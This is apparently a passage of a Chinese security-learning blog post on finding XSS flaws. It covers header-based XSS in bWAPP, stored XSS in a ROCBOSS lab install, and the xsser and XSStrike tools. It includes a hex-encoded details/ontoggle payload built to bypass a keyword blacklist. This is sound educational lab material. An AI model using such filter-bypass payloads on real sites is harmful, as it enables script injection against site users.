<p>JSON最常用的格式是对象的键值对。例如：</p>
<p>{“firstName”:”Brett”,”lastName”:”McLaughlin”}</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200416205446505.png" alt="image-20200416205446505"></p>
<h5 id="4、自定义HTTP头中的XSS"><a href="#4、自定义HTTP头中的XSS" class="headerlink" title="4、自定义HTTP头中的XSS"></a>4、自定义HTTP头中的XSS</h5><p>如果在HTTP自定义头中提交的参数值，在页面中显示。很有可能就存在XSS</p>
<p>进行抓包，发送到repeater模块</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200416210453280.png" alt="image-20200416210453280"></p>
<p>在里面定义一个bwapp然后运行，页面返回信息</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200416210905870.png" alt="image-20200416210905870"></p>
<p>改为XSS内容，执行，在代码中复制连接在页面打开</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200416211039263.png" alt="image-20200416211039263"></p>
<p>页面成功弹出弹框</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200416211147311.png" alt="image-20200416211147311"></p>
<h4 id="存储型XSS漏洞挖掘灰盒测试"><a href="#存储型XSS漏洞挖掘灰盒测试" class="headerlink" title="存储型XSS漏洞挖掘灰盒测试"></a>存储型XSS漏洞挖掘灰盒测试</h4><h5 id="1、环境搭建"><a href="#1、环境搭建" class="headerlink" title="1、环境搭建"></a>1、环境搭建</h5><p>使用phpStudy搭建 微社区程序-4-4—ROCBOSS</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417085414839.png" alt="image-20200417085414839"></p>
<h5 id="2、定向XSS挖掘"><a href="#2、定向XSS挖掘" class="headerlink" title="2、定向XSS挖掘"></a>2、定向XSS挖掘</h5><p>XSS漏洞可以存在于个人资料处，文章发表处或者留言评论处等</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417085758601.png" alt="image-20200417085758601"></p>
<h5 id="3、黑名单审计"><a href="#3、黑名单审计" class="headerlink" title="3、黑名单审计"></a>3、黑名单审计</h5><p>私信位置没有被实体化，可以进行XSS，但是被黑名单过滤</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417090319747.png" alt="image-20200417090319747"></p>
<p>查看过滤的名单，没有过滤details和ontaggle</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417090643047.png" alt="image-20200417090643047"></p>
<h5 id="4、绕过过滤，触发XSS"><a href="#4、绕过过滤，触发XSS" class="headerlink" title="4、绕过过滤，触发XSS"></a>4、绕过过滤，触发XSS</h5><p>已知过滤了javascript，构造了payload</p>
<p>因为javascript会被过滤掉，所以使用16进制进行绕过</p>
<p>打开details就会出发ontoggle事件</p>
<p><code>&quot;&gt;&lt;details open ontoggle=eval(&quot;\x6a\x61\x76\x61\x76\x61\x73\x63\x72\x69\x70\x74\x76\x3aalert(&#39;xss&#39;)&quot;)&gt;&lt;&quot;</code></p>
<p>进行私信发送</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417091315408.png" alt="image-20200417091315408"></p>
<p>成功弹出XSS</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417091334674.png" alt="image-20200417091334674"></p>
<h4 id="自动化XSS挖掘工具—xsser"><a href="#自动化XSS挖掘工具—xsser" class="headerlink" title="自动化XSS挖掘工具—xsser"></a>自动化XSS挖掘工具—xsser</h4><h5 id="1、xsser工具介绍"><a href="#1、xsser工具介绍" class="headerlink" title="1、xsser工具介绍"></a>1、xsser工具介绍</h5><p>xsser是一款针对web应用程序自动化挖掘、利用、报告xss漏洞的框架，kali下自带了xsser</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417092125950.png" alt="image-20200417092125950"></p>
<h5 id="2、xsser工具原理"><a href="#2、xsser工具原理" class="headerlink" title="2、xsser工具原理"></a>2、xsser工具原理</h5><p>原理</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417092243656.png" alt="image-20200417092243656"></p>
<h5 id="3、xsser帮助信息"><a href="#3、xsser帮助信息" class="headerlink" title="3、xsser帮助信息"></a>3、xsser帮助信息</h5><p>xsser -h</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417093057564.png" alt="image-20200417093057564"></p>
<p>注意：使用命令行工具时，不需要全部记忆参数，只需要熟练或用到时查找即可</p>
<h5 id="4、xsser启动方式"><a href="#4、xsser启动方式" class="headerlink" title="4、xsser启动方式"></a>4、xsser启动方式</h5><p>xsser启动方式可以分为命令行启动、图形化界面启动</p>
<p>在终端中以图形化界面启动输入</p>
<p><code>xsser --gtk</code></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417093744922.png" alt="image-20200417093744922"></p>
<h4 id="XSS-fuzzing工具"><a href="#XSS-fuzzing工具" class="headerlink" title="XSS fuzzing工具"></a>XSS fuzzing工具</h4><h5 id="1、XSStrike工具介绍"><a href="#1、XSStrike工具介绍" class="headerlink" title="1、XSStrike工具介绍"></a>1、XSStrike工具介绍</h5><p>XSStrike是一款检测Cross Site Scripting的高级检测工具。它集成了payload生成器、爬虫和模糊引擎功能。XSStrike不是像其他工具那样注入有效负载并检查其工作，而是通过多个解析器分析响应，然后通过与模糊引擎集成的上下文分析来保证有效负载。除此之外，XSStrike还具有爬行，模糊测试，参数发现，WAF检测功能。它还会扫描DOM XSS漏洞。</p>
<p>项目地址：<a href="https://github.com/s0md3v/XSStrike" target="_blank" rel="noopener">https://github.com/s0md3v/XSStrike</a></p>
<h5 id="2、XSStrike工具安装"><a href="#2、XSStrike工具安装" class="headerlink" title="2、XSStrike工具安装"></a>2、XSStrike工具安装</h5><p>XSStrike只能运行在py3.6以上版本</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417095550503.png" alt="image-20200417095550503"></p>
<h5 id="3、XSStrike帮助信息"><a href="#3、XSStrike帮助信息" class="headerlink" title="3、XSStrike帮助信息"></a>3、XSStrike帮助信息</h5><p>xsstrike -h查看帮助信息</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417095751376.png" alt="image-20200417095751376"></p>
<h5 id="4、XSStrike实例演示"><a href="#4、XSStrike实例演示" class="headerlink" title="4、XSStrike实例演示"></a>4、XSStrike实例演示</h5><p>python3 xsstrike.py -u “URL”</p>
<p>例如：</p>
<p>​    python3 xsstrike.py -u “<a href="http://192.168.1.102/xss-labs/level1.php?name=test&quot;" target="_blank" rel="noopener">http://192.168.1.102/xss-labs/level1.php?name=test&quot;</a>    </p>
<p>如果浏览器过滤的xss需要关闭xss筛选器</p>
<p>复制payload在浏览器的值后面输入</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417101428690.png" alt="image-20200417101428690"></p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
  
    <nav id="page-nav">
      <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">Next &amp;raquo;</a>
    </nav>
  
</div>
      <footer id="footer">
  <div class="outer">
    <div id="footer-info">
      <div class="footer-left">
        &copy; 2020 zhanqiaozai
      </div>
        <div class="footer-right">
          <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/smackgg/hexo-theme-smackdown" target="_blank">Smackdown</a>
        </div>
    </div>
  </div>
</footer>
    </div>
    
  
<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">



<script>
	var yiliaConfig = {
		fancybox: true,
		mathjax: true,
		animate: true,
		isHome: true,
		isPost: false,
		isArchive: false,
		isTag: false,
		isCategory: false,
		open_in_new: false
	}
</script>

<script src="/js/main.js"></script>




<script type="text/x-mathjax-config">
MathJax.Hub.Config({
    tex2jax: {
        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
        processEscapes: true,
        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
    }
});

MathJax.Hub.Queue(function() {
    var all = MathJax.Hub.getAllJax(), i;
    for(i=0; i < all.length; i += 1) {
        all[i].SourceElement().parentNode.className += ' has-jax';                 
    }       
});
</script>

<script src="//cdn.bootcss.com/mathjax/2.7.0/MathJax.js"></script>


  </div>
</body>
</html>